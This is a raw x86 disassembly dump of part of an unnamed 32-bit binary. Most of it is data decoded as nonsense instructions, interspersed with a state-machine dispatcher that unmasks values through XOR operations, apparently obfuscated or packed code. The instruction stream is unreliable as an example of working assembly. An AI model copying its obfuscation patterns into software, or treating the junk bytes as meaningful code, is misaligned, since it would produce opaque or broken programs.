  40eb04:	xor    ecx,DWORD PTR [eax+0x74ee01fd]
  40eb0a:	cmc    
  40eb0b:	pop    esp
  40eb0c:	outs   dx,DWORD PTR ds:[esi]
  40eb0d:	mov    ah,0x64
  40eb0f:	push   ecx
  40eb10:	dec    eax
  40eb11:	inc    ebp
  40eb12:	mov    ebp,0xe3ca76c
  40eb17:	push   ds
  40eb18:	push   es
  40eb19:	test   al,0x2f
  40eb1b:	push   cs
  40eb1c:	mov    ah,0x74
  40eb1e:	xchg   DWORD PTR [esi+0x7ce1905e],edi
  40eb24:	dec    ebx
  40eb25:	push   ecx
  40eb26:	aaa    
  40eb27:	or     ecx,DWORD PTR [ecx+0x59bf7b9b]
  40eb2d:	rcl    BYTE PTR ds:0xad68a22,cl
  40eb33:	test   eax,0xa9f8b73
  40eb38:	jnp    0x40eb34
  40eb3a:	call   0xc60232f5
  40eb3f:	mov    al,0x3d
  40eb41:	out    0x52,al
  40eb43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb44:	inc    esi
  40eb45:	sub    BYTE PTR [edx+0x3f],ch
  40eb48:	dec    ecx
  40eb49:	fbld   TBYTE PTR [edi+0x4f]
  40eb4c:	add    ah,BYTE PTR [edi-0x2fd404a6]
  40eb52:	scas   eax,DWORD PTR es:[edi]
  40eb53:	loop   0x40eb3d
  40eb55:	ficomp DWORD PTR [ecx-0xb]
  40eb58:	cmp    ah,cl
  40eb5a:	jo     0x40eb41
  40eb5c:	sbb    dl,0x19
  40eb5f:	daa    
  40eb60:	mov    bl,0x86
  40eb62:	ret    0xb078
  40eb65:	add    al,0x94
  40eb67:	add    DWORD PTR [edx-0x7],0xffffffbb
  40eb6b:	outs   dx,BYTE PTR ds:[esi]
  40eb6c:	jl     0x40eb67
  40eb6e:	push   esi
  40eb6f:	mov    ds:0x9a123765,eax
  40eb74:	lods   eax,DWORD PTR ds:[esi]
  40eb75:	sbb    BYTE PTR [edi-0x16a63daa],bh
  40eb7b:	sti    
  40eb7c:	jl     0x40eb39
  40eb7e:	jle    0x40ebfe
  40eb80:	jo     0x40ebe4
  40eb82:	pop    edi
  40eb83:	outs   dx,BYTE PTR ds:[esi]
  40eb84:	arpl   WORD PTR [esi-0x4b],si
  40eb87:	arpl   WORD PTR [edx],ax
  40eb89:	xor    ch,BYTE PTR [ecx+0x42]
  40eb8c:	pop    esi
  40eb8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb8e:	push   esp
  40eb8f:	push   es
  40eb90:	cmc    
  40eb91:	jae    0x40eb6e
  40eb93:	pushf  
  40eb94:	loop   0x40ebc5
  40eb96:	out    dx,eax
  40eb97:	xchg   ebp,eax
  40eb98:	inc    eax
  40eb99:	dec    edx
  40eb9a:	or     DWORD PTR [eax+0x28],edi
  40eb9d:	and    ebp,ebp
  40eb9f:	cmp    bl,cl
  40eba1:	int3   
  40eba2:	push   ss
  40eba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eba4:	cdq    
  40eba5:	nop
  40eba6:	inc    esp
  40eba7:	test   al,0x22
  40eba9:	rol    dl,cl
  40ebab:	daa    
  40ebac:	mov    ebp,0xe430f27a
  40ebb1:	pop    es
  40ebb2:	test   eax,0x3cdd4dec
  40ebb7:	cmp    DWORD PTR [eax],0xffffff89
  40ebba:	pop    ecx
  40ebbb:	jl     0x40ec33
  40ebbd:	xchg   ebp,eax
  40ebbe:	gs or  eax,eax
  40ebc1:	sar    BYTE PTR [ecx],1
  40ebc3:	pop    esi
  40ebc4:	fiadd  WORD PTR [esi-0x6b44fe96]
  40ebca:	xchg   ebp,eax
  40ebcb:	stc    
  40ebcc:	dec    ecx
  40ebcd:	pop    ebx
  40ebce:	pushf  
  40ebcf:	sbb    dh,dl
  40ebd1:	xor    DWORD PTR [ecx-0x23],eax
  40ebd4:	mov    ch,0xe2
  40ebd6:	lock les edx,FWORD PTR [esi+0x38599fed]
  40ebdd:	bound  edx,QWORD PTR [eax+0x4a]
  40ebe0:	mul    ch
  40ebe2:	jg     0x40ec4d
  40ebe4:	push   esi
  40ebe5:	into   
  40ebe6:	and    ebx,DWORD PTR [edx]
  40ebe8:	and    dh,BYTE PTR [esi+0x2f]
  40ebeb:	or     al,dh
  40ebed:	out    0x33,eax
  40ebef:	mov    eax,ds:0xe32c2651
  40ebf4:	pop    esi
  40ebf5:	jmp    0xd702:0xa3016745
  40ebfc:	out    0x63,eax
  40ebfe:	aas    
  40ebff:	push   edx
  40ec00:	ja     0x40eb91
  40ec02:	clc    
  40ec03:	jns    0x40ebbe
  40ec05:	repnz inc esi
  40ec07:	fnstcw WORD PTR [edx+0xf]
  40ec0a:	test   eax,0x3b035d9a
  40ec0f:	out    0xb1,al
  40ec11:	or     al,0x32
  40ec13:	dec    ebp
  40ec14:	in     eax,dx
  40ec15:	dec    edx
  40ec16:	loopne 0x40ec7b
  40ec18:	cdq    
  40ec19:	inc    edi
  40ec1a:	and    BYTE PTR [esi-0x68],cl
  40ec1d:	xchg   DWORD PTR [esi-0x3280bdc8],ecx
  40ec23:	popf   
  40ec24:	mov    esi,0x6729e8fc
  40ec29:	or     eax,0xb049b447
  40ec2e:	std    
  40ec2f:	sbb    dl,BYTE PTR [edi-0x55]
  40ec32:	dec    eax
  40ec33:	ja     0x40ec32
  40ec35:	cmp    al,0xd1
  40ec37:	in     al,0xd6
  40ec39:	ds mov edi,0x6d85cd8
  40ec3f:	jne    0x40ec8e
  40ec41:	adc    bh,BYTE PTR [edx]
  40ec43:	shl    DWORD PTR [ebp-0x6b],1
  40ec46:	dec    esi
  40ec47:	add    esp,DWORD PTR [ebx]
  40ec49:	dec    ax
  40ec4b:	mov    eax,DWORD PTR [eax]
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [ebx+eiz*1-0x2a364a],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	push   cs
  40eccd:	jecxz  0x40eceb
  40eccf:	shr    BYTE PTR [ebx-0x41],cl
  40ecd2:	not    DWORD PTR [esi]
  40ecd4:	sbb    al,0xb1
  40ecd6:	fild   WORD PTR [ebx-0x1811584a]
  40ecdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecdd:	adc    BYTE PTR ds:[edx+0x5cf81e26],al
  40ece4:	xor    bh,cl
  40ece6:	dec    edx
  40ece7:	dec    edx
  40ece8:	fisub  WORD PTR [ebx-0x4d]
  40eceb:	sahf   
  40ecec:	shr    BYTE PTR [esi],0x9b
  40ecef:	jo     0x40ecc6
  40ecf1:	retf   0x1af4
  40ecf4:	or     al,0x69
  40ecf6:	daa    
  40ecf7:	cs loop 0x40ecc5
  40ecfa:	popf   
  40ecfb:	push   edi
  40ecfc:	inc    edi
  40ecfd:	xor    ebx,eax
  40ecff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed00:	cmp    edx,DWORD PTR [edi-0x6155bc7c]
  40ed06:	mov    al,0xa5
  40ed08:	shl    DWORD PTR [esi+0x29],cl
  40ed0b:	dec    esi
  40ed0c:	rcr    dh,0x6e
  40ed0f:	and    ebx,DWORD PTR ds:0x89d93dfd
  40ed15:	and    BYTE PTR [ebx],ch
  40ed17:	(bad)  
  40ed18:	(bad)  
  40ed1a:	mov    bh,0x92
  40ed1c:	stc    
  40ed1d:	inc    edx
  40ed1e:	test   eax,0x24849046
  40ed23:	cmp    ebp,0x54cef0e3
  40ed29:	inc    esi
  40ed2a:	jl     0x40ed3b
  40ed2c:	pop    es
  40ed2d:	daa    
  40ed2e:	popf   
  40ed2f:	inc    ebx
  40ed30:	shl    cl,0xed
  40ed33:	cwde   
  40ed34:	add    BYTE PTR [esi-0x74],dl
  40ed37:	ret    0xc2f
  40ed3a:	lds    esp,FWORD PTR [edx-0x1d]
  40ed3d:	popa   
  40ed3e:	mov    DWORD PTR [eax-0x57bc7c32],ebp
  40ed44:	sub    dh,BYTE PTR [ebx+0x7905771f]
  40ed4a:	xor    bh,BYTE PTR [edi+0x46]
  40ed4d:	ret    
  40ed4e:	dec    edx
  40ed4f:	das    
  40ed50:	cmp    al,0x17
  40ed52:	and    BYTE PTR [ecx+0x73b53a70],ah
  40ed58:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ed5a:	sub    esp,DWORD PTR [eax]
  40ed5c:	std    
  40ed5d:	pop    edi
  40ed5e:	lea    edx,[esi]
  40ed60:	jmp    0x40ed8d
  40ed62:	push   eax
  40ed63:	inc    eax
  40ed64:	add    al,0x14
  40ed66:	int3   
  40ed67:	sbb    edi,0xb39c6c90
  40ed6d:	call   0xeb7ee26d
  40ed72:	pop    es
  40ed73:	data16 ror BYTE PTR [esi],cl
  40ed76:	push   eax
  40ed77:	inc    ecx
  40ed78:	mov    dl,0xda
  40ed7a:	fwait
  40ed7b:	or     DWORD PTR [esp+eiz*2],ecx
  40ed7e:	push   es
  40ed7f:	mov    dl,0xf6
  40ed81:	xor    eax,DWORD PTR [eax]
  40ed83:	test   DWORD PTR [edi-0x11b8c8e6],ecx
  40ed89:	push   0xffffffa0
  40ed8b:	push   ss
  40ed8c:	(bad)  
  40ed8d:	stc    
  40ed8e:	loopne 0x40eda1
  40ed90:	xchg   ecx,eax
  40ed91:	inc    esp
  40ed92:	mov    WORD PTR [eax],fs
  40ed94:	mov    ebx,0x9fd28485
  40ed99:	in     eax,dx
  40ed9a:	(bad)  
  40ed9b:	sub    DWORD PTR [ebx+0x3c],esp
  40ed9e:	add    al,0xbe
  40eda0:	inc    eax
  40eda1:	out    dx,eax
  40eda2:	or     al,0x82
  40eda4:	outs   dx,BYTE PTR ds:[esi]
  40eda5:	push   ecx
  40eda6:	adc    eax,0xcbcb900f
  40edab:	lahf   
  40edac:	das    
  40edad:	jle    0x40edda
  40edaf:	sbb    cl,BYTE PTR ss:[esi+0x71]
  40edb3:	add    BYTE PTR [edx+0x4c73346c],0x8d
  40edba:	mov    ebp,0x817f01a3
  40edbf:	mov    eax,ds:0xe913cbb4
  40edc4:	sahf   
  40edc5:	sub    eax,0xc28fb085
  40edca:	fucomi st,st(0)
  40edcc:	inc    ecx
  40edcd:	ins    DWORD PTR es:[edi],dx
  40edce:	push   0x34
  40edd0:	mov    ah,0xfe
  40edd2:	xor    ecx,DWORD PTR [edi-0x53]
  40edd5:	xchg   ebx,eax
  40edd6:	xchg   esp,eax
  40edd7:	xchg   ebp,eax
  40edd8:	cmp    cl,BYTE PTR [edi-0x3f1d5e05]
  40edde:	dec    ecx
  40eddf:	(bad)  
  40ede0:	outs   dx,BYTE PTR ds:[esi]
  40ede1:	dec    DWORD PTR [ebx-0x7d2f7328]
  40ede7:	test   ah,0xc0
  40edea:	dec    ecx
  40edeb:	cmp    eax,0x98731a1d
  40edf0:	dec    edi
  40edf1:	pop    edi
  40edf2:	dec    ecx
  40edf3:	int    0x69
  40edf5:	push   esi
  40edf6:	sub    al,0x5d
  40edf8:	or     bl,BYTE PTR [ecx+0x68e52d9e]
  40edfe:	add    bh,bl
  40ee00:	sbb    al,0x16
  40ee02:	int3   
  40ee03:	gs dec eax
  40ee05:	popa   
  40ee06:	dec    esi
  40ee07:	inc    esp
  40ee08:	add    esp,edi
  40ee0a:	pop    ebx
  40ee0b:	ins    BYTE PTR es:[edi],dx
  40ee0c:	mov    ah,0x5f
  40ee0e:	inc    eax
  40ee0f:	or     dl,dl
  40ee11:	sbb    DWORD PTR [ebp-0x69],esi
  40ee14:	mov    al,0xca
  40ee16:	cmp    eax,0xc4ce02be
  40ee1b:	jb     0x40eda4
  40ee1d:	mov    ds:0x4d4cd313,eax
  40ee22:	setns  BYTE PTR fs:[ebx-0x6fb272ab]
  40ee2a:	es (bad) 
  40ee2c:	in     al,dx
  40ee2d:	mov    esi,0xfea4d9a3
  40ee32:	jecxz  0x40ee4e
  40ee34:	sbb    DWORD PTR [ebp+0x47e4f2de],eax
  40ee3a:	pop    ss
  40ee3b:	stos   BYTE PTR es:[edi],al
  40ee3c:	aam    0x9f
  40ee3e:	repz shl BYTE PTR ds:0x9d1569d3,cl
  40ee45:	xor    al,0x6
  40ee47:	out    0x9c,eax
  40ee49:	(bad)  
  40ee4a:	cwde   
  40ee4b:	(bad)  
  40ee4c:	mov    eax,0x3047f939
  40ee51:	sti    
  40ee52:	popf   
  40ee53:	lods   eax,DWORD PTR ds:[esi]
  40ee54:	push   edx
  40ee55:	push   esp
  40ee56:	xor    DWORD PTR [edi+0x6c],0x44ed1030
  40ee5d:	in     al,0xf4
  40ee5f:	pop    ebx
  40ee60:	adc    eax,0x2d2269be
  40ee65:	lea    edi,[ecx+0x2222a8d1]
  40ee6b:	add    BYTE PTR ss:[ecx-0x61ac21cd],0x6e
  40ee73:	xchg   esi,eax
  40ee74:	(bad)  
  40ee75:	xor    edx,edx
  40ee77:	icebp  
  40ee78:	sbb    esp,ebx
  40ee7a:	sub    edx,0x60e49e7b
  40ee80:	sub    edi,DWORD PTR [edi-0x5f]
  40ee83:	sub    al,0x1e
  40ee85:	xor    eax,0xea8ef61d
  40ee8a:	pop    ebx
  40ee8b:	call   0x76374846
  40ee90:	sbb    DWORD PTR [esi-0x30],esp
  40ee93:	dec    ebx
  40ee94:	mov    al,bl
  40ee96:	enter  0xb6d2,0x6b
  40ee9a:	mov    ds:0x9a0cc3e3,eax
  40ee9f:	sbb    DWORD PTR [eax-0xa],edi
  40eea2:	sub    DWORD PTR [ebx],esp
  40eea4:	loope  0x40eea1
  40eea6:	or     ch,BYTE PTR [esi+edi*8]
  40eea9:	test   eax,eax
  40eeab:	xchg   edx,eax
  40eeac:	dec    esi
  40eead:	int    0x42
  40eeaf:	(bad)  
  40eeb0:	nop
  40eeb1:	loop   0x40ee88
  40eeb3:	cdq    
  40eeb4:	pop    ds
  40eeb5:	sar    DWORD PTR [edx],cl
  40eeb7:	push   esp
  40eeb8:	add    eax,0x1da9afb2
  40eebd:	mov    esp,0x4d97c79b
  40eec2:	cmc    
  40eec3:	ret    0x3632
  40eec6:	lock sbb al,0x8d
  40eec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeca:	aad    0xc8
  40eecc:	(bad)
  40eecf:	mov    al,0x2f
  40eed1:	iret   
  40eed2:	popf   
  40eed3:	aas    
  40eed4:	jle    0x40ee5c
  40eed6:	inc    ebx
  40eed7:	(bad)  
  40eed8:	stc    
  40eed9:	pop    eax
  40eeda:	sub    eax,0x5b9de8ee
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x3b6710ba],0x8ff4fe25
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef3b
  40ef11:	leave  
  40ef12:	jp     0x40ef60
  40ef14:	aas    
  40ef15:	mov    edx,0x4b7317fd
  40ef1a:	fidiv  DWORD PTR gs:[esi+0x8]
  40ef1e:	sbb    DWORD PTR es:[edx+ebx*4+0x5a116f7e],esi
  40ef26:	popa   
  40ef27:	pop    eax
  40ef28:	gs or  ebp,ecx
  40ef2b:	call   0x989a:0xc75bfaff
  40ef32:	ja     0x40eefa
  40ef34:	stos   DWORD PTR es:[edi],eax
  40ef35:	jo     0x40ef89
  40ef37:	add    eax,0x7bdb42d9
  40ef3c:	mov    dl,0x71
  40ef3e:	sub    dl,cl
  40ef40:	fadd   QWORD PTR ds:0x94887fd3
  40ef46:	ins    BYTE PTR es:[edi],dx
  40ef47:	lahf   
  40ef48:	imul   ebp,DWORD PTR [ecx],0x5614ccc3
  40ef4e:	leave  
  40ef4f:	test   BYTE PTR [ebx],al
  40ef51:	aam    0xc7
  40ef53:	and    ecx,DWORD PTR [edi+0x59]
  40ef56:	and    eax,0x73f2f389
  40ef5b:	jle    0x40efd6
  40ef5d:	cmp    ch,bh
  40ef5f:	push   es
  40ef60:	les    eax,FWORD PTR [edx+0x4d]
  40ef63:	jno    0x40ef2b
  40ef65:	es into 
  40ef67:	jmp    0x40ef65
  40ef69:	shl    al,cl
  40ef6b:	and    dh,BYTE PTR [edx]
  40ef6d:	dec    esp
  40ef6e:	xchg   bl,bl
  40ef70:	sub    eax,0x1ff28347
  40ef75:	xchg   esi,eax
  40ef76:	scas   eax,DWORD PTR es:[edi]
  40ef77:	out    dx,eax
  40ef78:	into   
  40ef79:	sbb    esp,DWORD PTR [esi+0x2590791e]
  40ef7f:	pushf  
  40ef80:	adc    ebx,DWORD PTR [ecx]
  40ef82:	enter  0x13e,0x9c
  40ef86:	rcr    BYTE PTR [edx],1
  40ef88:	mov    edx,0xd42bb647
  40ef8d:	iret   
  40ef8e:	dec    ebp
  40ef8f:	mov    dh,BYTE PTR [edi+0x52]
  40ef92:	rcr    ah,0x18
  40ef95:	and    BYTE PTR [ebx],dl
  40ef97:	xchg   esi,eax
  40ef98:	pop    ebp
  40ef99:	mov    dh,0xd0
  40ef9b:	lock pop ebp
  40ef9d:	mov    cs,WORD PTR [esp+ebx*4+0x2f202ae1]
  40efa4:	and    eax,0x86fc4894
  40efa9:	mov    dh,0x27
  40efab:	push   0x59c02cd0
  40efb0:	imul   ecx,DWORD PTR [edx],0xad00a1b7
  40efb6:	xchg   ebx,eax
  40efb7:	repz lock push ebx
  40efba:	pop    ds
  40efbb:	push   ds
  40efbc:	pop    ebx
  40efbd:	add    eax,0xc71c7815
  40efc2:	or     al,0xce
  40efc4:	imul   eax,DWORD PTR [edx+0x59],0xffffff9c
  40efc8:	and    DWORD PTR [eax],0xffffffd4
  40efcb:	and    DWORD PTR [ecx-0x2c],esp
  40efce:	mov    ebx,0xf3ad0bde
  40efd3:	es jecxz 0x40efce
  40efd6:	lahf   
  40efd7:	pop    esp
  40efd8:	clc    
  40efd9:	aaa    
  40efda:	add    esp,edx
  40efdc:	rcr    BYTE PTR [edi+0x5d],1
  40efdf:	loopne 0x40ef69
  40efe1:	loop   0x40efe3
  40efe3:	mov    bh,0x91
  40efe5:	jmp    0x75a2:0x9536f696
  40efec:	dec    ecx
  40efed:	not    edi
  40efef:	adc    BYTE PTR [ecx],0xe7
  40eff2:	xchg   edx,eax
  40eff3:	mov    al,ds:0xc7adbcb3
  40eff8:	adc    al,0xf7
  40effa:	sub    eax,0x67054599
  40efff:	jmp    0x40efda
  40f001:	or     bh,BYTE PTR [ecx]
  40f003:	or     dl,dh
  40f005:	pop    ebx
  40f006:	std    
  40f007:	sbb    DWORD PTR [edi],edx
  40f009:	lea    edx,[edx+0x10c1c2e9]
  40f00f:	pusha  
  40f010:	push   0xfcea1ba1
  40f015:	mov    ah,0xae
  40f017:	loope  0x40f015
  40f019:	pop    ebp
  40f01a:	add    esi,ebp
  40f01c:	dec    ebx
  40f01d:	rcl    BYTE PTR [ebx+0x2246591],cl
  40f023:	(bad)  
  40f024:	xor    bh,dh
  40f026:	mov    ?,WORD PTR [esi-0x39602225]
  40f02c:	cmc    
  40f02d:	dec    edi
  40f02e:	data16 arpl WORD PTR [edx+edi*4],di
  40f032:	mov    ecx,0x21978d84
  40f037:	xlat   BYTE PTR ds:[ebx]
  40f038:	adc    eax,0x33028b47
  40f03d:	push   ebx
  40f03e:	ror    DWORD PTR [ebx+0x5e],1
  40f041:	add    dh,BYTE PTR [eax]
  40f043:	shl    edi,cl
  40f045:	jne    0x40f088
  40f047:	cmp    ecx,DWORD PTR [ecx+0xc82ea41]
  40f04d:	dec    esp
  40f04e:	sub    eax,0xd462a583
  40f053:	add    al,0xfa
  40f055:	jle    0x40f0a3
  40f057:	adc    al,0x17
  40f059:	jno    0x40f082
  40f05b:	adc    DWORD PTR [esi+0x79149f91],edi
  40f061:	jae    0x40f02c
  40f063:	stc    
  40f064:	div    DWORD PTR [ecx+ecx*2+0x5a]
  40f068:	mov    eax,ecx
  40f06a:	jecxz  0x40f07a
  40f06c:	inc    ebx
  40f06d:	out    dx,eax
  40f06e:	adc    al,BYTE PTR [ecx-0x356f99be]
  40f074:	pop    ds
  40f075:	pop    ebx
  40f076:	sub    DWORD PTR [ebx+ecx*4],eax
  40f079:	inc    ebx
  40f07a:	push   ds
  40f07b:	loop   0x40f053
  40f07d:	(bad)  ds:0xec8466dc
  40f083:	dec    esp
  40f084:	mov    bl,0x82
  40f086:	test   eax,0x9594647
  40f08b:	int    0xfa
  40f08d:	imul   esp,DWORD PTR [edi],0x22
  40f090:	mov    edx,ebx
  40f092:	mov    bh,bh
  40f094:	js     0x40f0e5
  40f096:	inc    esp
  40f097:	xchg   ebp,eax
  40f098:	(bad)  
  40f099:	jle    0x40f06b
  40f09b:	jnp    0x40f02c
  40f09d:	jp     0x40f094
  40f09f:	xor    BYTE PTR [ebp+0xb],0x31
  40f0a3:	cli    
  40f0a4:	jmp    0xd68:0xe0014fa5
  40f0ab:	sub    dl,BYTE PTR [ebx-0x7d827471]
  40f0b1:	dec    esi
  40f0b2:	mov    ch,0xc1
  40f0b4:	bound  esp,QWORD PTR [esp+ebx*4]
  40f0b7:	jne    0x40f119
  40f0b9:	inc    edi
  40f0ba:	inc    ebp
  40f0bb:	mov    esp,esp
  40f0bd:	pop    edi
  40f0be:	jno    0x40f102
  40f0c0:	inc    edx
  40f0c1:	adc    edi,ebp
  40f0c3:	in     al,dx
  40f0c4:	xchg   edi,eax
  40f0c5:	mov    ebp,0xd48960db
  40f0ca:	sahf   
  40f0cb:	not    ch
  40f0cd:	mov    al,0x47
  40f0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0d0:	pop    ecx
  40f0d1:	das    
  40f0d2:	ffreep st(6)
  40f0d4:	jp     0x40f13a
  40f0d6:	xchg   edi,eax
  40f0d7:	mov    cl,0x5b
  40f0d9:	push   0x5a6b27a6
  40f0de:	add    al,0xef
  40f0e0:	out    0xee,al
  40f0e2:	mov    ecx,0x2e03c802
  40f0e7:	into   
  40f0e8:	xchg   esi,eax
  40f0e9:	std    
  40f0ea:	jmp    FWORD PTR [edi+0x77ccf050]
  40f0f0:	dec    esp
  40f0f1:	lds    edi,FWORD PTR [ecx]
  40f0f3:	xchg   ebp,eax
  40f0f4:	jle    0x40f140
  40f0f6:	push   esp
  40f0f7:	adc    al,0x11
  40f0f9:	jg     0x40f16f
  40f0fb:	fs in  al,dx
  40f0fd:	push   esp
  40f0fe:	cwde   
  40f0ff:	add    ch,BYTE PTR [edx-0x2dfd9c8f]
  40f105:	scas   eax,DWORD PTR es:[edi]
  40f106:	(bad)  
  40f108:	test   al,0xa7
  40f10a:	fmul   QWORD PTR [edx-0xe]
  40f10d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10f:	jo     0x40f17a
  40f111:	sub    DWORD PTR [ebp+0x6],edi
  40f114:	(bad)  
  40f115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f116:	pop    edi
  40f117:	cld    
  40f118:	or     eax,0x8782ec3a
  40f11d:	(bad)  
  40f11e:	div    DWORD PTR [ebx]
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0x32473843]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f228
  40f1e9:	daa    
  40f1ea:	out    0x49,eax
  40f1ec:	xchg   BYTE PTR [edx+0x7027420a],al
  40f1f2:	sub    DWORD PTR [ebp+0xba1bcdb],edi
  40f1f8:	outs   dx,BYTE PTR ds:[esi]
  40f1f9:	lea    edx,[esi+0x18]
  40f1fc:	leave  
  40f1fd:	rol    DWORD PTR [edx],cl
  40f1ff:	int3   
  40f200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f201:	jge    0x40f1d2
  40f203:	fwait
  40f204:	push   esi
  40f205:	mov    ds:0x6ec880ef,al
  40f20a:	cmp    eax,0x135677c8
  40f20f:	mov    eax,ds:0xc9b7acc5
  40f214:	fdiv   st,st(5)
  40f216:	dec    ebp
  40f217:	div    DWORD PTR ds:0x60b77095
  40f21d:	xchg   ebx,eax
  40f21e:	xor    cl,BYTE PTR [eax+0x21]
  40f221:	mov    ?,WORD PTR ss:0x9de57d45
  40f228:	and    al,0x27
  40f22a:	test   BYTE PTR gs:[eax],0x44
  40f22e:	ret    0x9ff
  40f231:	add    DWORD PTR [edi],ebp
  40f233:	out    dx,al
  40f234:	cmp    BYTE PTR [ebx-0x59a4b614],bl
  40f23a:	rcr    BYTE PTR [esi-0xd],0xbb
  40f23e:	xlat   BYTE PTR ds:[ebx]
  40f23f:	scas   eax,DWORD PTR es:[edi]
  40f240:	cli    
  40f241:	imul   esp,DWORD PTR [ebp-0x37],0x36
  40f245:	inc    ecx
  40f246:	jmp    FWORD PTR [eax]
  40f248:	clc    
  40f249:	cmp    ecx,edi
  40f24b:	es (bad) 
  40f24d:	(bad)  
  40f24e:	mov    dl,0x0
  40f250:	pop    eax
  40f251:	mov    esi,0x12bbd96a
  40f256:	jbe    0x40f29e
  40f258:	test   al,0x73
  40f25a:	inc    esp
  40f25b:	push   eax
  40f25c:	cmp    ecx,0x4fa0f5f0
  40f262:	nop
  40f263:	aam    0xcc
  40f265:	ja     0x40f29a
  40f267:	mov    esi,0x3ef0158
  40f26c:	mov    ds:0xb21811e7,eax
  40f271:	cwde   
  40f272:	arpl   WORD PTR ds:0x313553b,sp
  40f278:	int    0x23
  40f27a:	push   esi
  40f27b:	xlat   BYTE PTR ds:[ebx]
  40f27c:	jmp    0x40f287
  40f27e:	or     DWORD PTR [edx+0x75],esi
  40f281:	mov    ebp,0xe54c261d
  40f286:	or     DWORD PTR [edi],edx
  40f288:	sti    
  40f289:	xchg   ebp,eax
  40f28a:	mov    ds:0x5f48c177,al
  40f28f:	sbb    eax,ecx
  40f291:	dec    ebx
  40f292:	push   cs
